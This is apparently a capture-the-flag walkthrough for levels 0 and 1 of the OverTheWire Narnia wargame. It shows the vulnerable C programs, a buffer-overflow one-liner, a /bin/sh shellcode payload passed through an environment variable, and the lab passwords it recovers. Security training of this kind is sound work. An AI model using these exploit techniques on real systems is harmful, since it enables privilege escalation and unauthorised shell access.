---
title: OverTheWire：Narnia
---

## Level 0

<table>
<tbody>
  <tr>
    <td>Username</td>
    <td>narnia0</td>
  </tr>
</tbody>
<tbody>
  <tr>
    <td>Password</td>
    <td>narnia0</td>
  </tr>
</tbody>
</table>

```bash
$ ssh narnia0@narnia.labs.overthewire.org -p 2226
$ cd /narnia/
$ ls
narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8
narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c
```

```bash
$ cat narnia0.c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
$ (python3 -c "import sys; sys.stdout.buffer.write(b'a' * 20 + int.to_bytes(0xdeadbeef, 4, 'little'))"; cat) | ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
id
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
cat /etc/narnia_pass/narnia1
eaa6AjYMBB
```

## Level 1

<table>
<tbody>
  <tr>
    <td>Username</td>
    <td>narnia1</td>
  </tr>
</tbody>
<tbody>
  <tr>
    <td>Password</td>
    <td>eaa6AjYMBB</td>
  </tr>
</tbody>
</table>

```bash
$ ssh narnia1@narnia.labs.overthewire.org -p 2226
$ cd /narnia/
$ cat narnia1.c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
# 可以执行 shellcode
# 参考 narnia0 需要先 setreuid(geteuid(), geteuid())
# http://shell-storm.org/shellcode/files/shellcode-399.html
$ EGG=`python3 -c "import sys; sys.stdout.buffer.write(b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')"` ./narnia1
Trying to execute EGG!
$ id
uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)
$ cat /etc/narnia_pass/narnia2
Zzb6MIyceT
$ exit
```